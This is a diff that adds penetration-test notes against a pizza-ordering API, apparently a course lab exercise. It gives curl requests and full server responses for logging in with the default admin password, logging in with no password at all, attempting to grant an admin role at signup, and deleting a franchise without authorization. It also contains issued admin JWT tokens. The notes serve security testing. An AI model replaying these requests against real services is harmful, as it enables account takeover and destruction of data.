@@ -1,0 +1,68 @@
+Using default admin password
+
+curl -i -X PUT 'https://pizza-service.peachfromtheirs.click/api/auth/' -H 'Content-Type: application/json' -d '{"email":"a@jwt.com","password":"admin"}' 
+
+HTTP/2 200 
+date: Wed, 10 Dec 2025 01:00:58 GMT
+content-type: application/json; charset=utf-8
+content-length: 304
+x-powered-by: Express
+access-control-allow-origin: *
+access-control-allow-methods: GET, POST, PUT, DELETE
+access-control-allow-headers: Content-Type, Authorization
+access-control-allow-credentials: true
+etag: W/"130-pPNWDnf7+gQ1ihZaa7tHAAGtp9k"
+
+{"user":{"id":1,"name":"常用名字","email":"a@jwt.com","roles":[{"role":"admin"}]},"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwibmFtZSI6IuW4uOeUqOWQjeWtlyIsImVtYWlsIjoiYUBqd3QuY29tIiwicm9sZXMiOlt7InJvbGUiOiJhZG1pbiJ9XSwiaWF0IjoxNzY1MzI4NDU4fQ.u9bohvKuKgbckKLDA9-gdll-n8JwBui2EWTCLBv1ZUE"}
+
+
+
+
+No password field
+
+$ curl -i -X PUT 'https://pizza-service.peachfromtheirs.click/api/auth/' -H 'Content-Type: application/json' -d '{"email":"a@jwt.com"}'
+
+HTTP/2 200 
+date: Wed, 10 Dec 2025 01:02:38 GMT
+content-type: application/json; charset=utf-8
+content-length: 304
+x-powered-by: Express
+access-control-allow-origin: *
+access-control-allow-methods: GET, POST, PUT, DELETE
+access-control-allow-headers: Content-Type, Authorization
+access-control-allow-credentials: true
+etag: W/"130-UJUxUQ/uKCb9rVOJOSsToPxjKCQ"
+
+{"user":{"id":1,"name":"常用名字","email":"a@jwt.com","roles":[{"role":"admin"}]},"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwibmFtZSI6IuW4uOeUqOWQjeWtlyIsImVtYWlsIjoiYUBqd3QuY29tIiwicm9sZXMiOlt7InJvbGUiOiJhZG1pbiJ9XSwiaWF0IjoxNzY1MzI4NTU4fQ.NHgPukP7KA6r1tpp3LKbejZuHLb69Q9Ad4ZB-mz1vyA"}
+
+
+
+
+Creating an admin user
+
+curl -i -X POST 'https://pizza-service.peachfromtheirs.click/api/auth/' -H 'Content-Type: application/json' -d '{"name":"Admin Account","email":"admin@example.com","password":"StrongP@ssw0rd","roles":[{"role":"admin"}]}'
+
+HTTP/2 200 
+date: Wed, 10 Dec 2025 00:58:23 GMT
+content-type: application/json; charset=utf-8
+content-length: 325
+x-powered-by: Express
+access-control-allow-origin: *
+access-control-allow-methods: GET, POST, PUT, DELETE
+access-control-allow-headers: Content-Type, Authorization
+access-control-allow-credentials: true
+etag: W/"145-E9gEzaUtuzivsTctlmD9vY5ewF4"
+
+{"user":{"name":"Admin Account","email":"admin@example.com","roles":[{"role":"diner"}],"id":5},"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiQWRtaW4gQWNjb3VudCIsImVtYWlsIjoiYWRtaW5AZXhhbXBsZS5jb20iLCJyb2xlcyI6W3sicm9sZSI6ImRpbmVyIn1dLCJpZCI6NSwiaWF0IjoxNzY1MzI4MzAzfQ.-NPOtH773InrqOjBpPS-dICQ5bxaDRLk4kz0AudCE4Y"}
+
+
+
+
+
+Getting and then deleting franchises unauthorized
+
+curl https://pizza-service.peachfromtheirs.click/api/franchise
+{"franchises":[{"id":1,"name":"pizzaPocket","stores":[{"id":1,"name":"SLC"}]}],"more":false}
+
+curl -X DELETE https://pizza-service.peachfromtheirs.click/api/franchise/1
+{"message":"franchise deleted"}
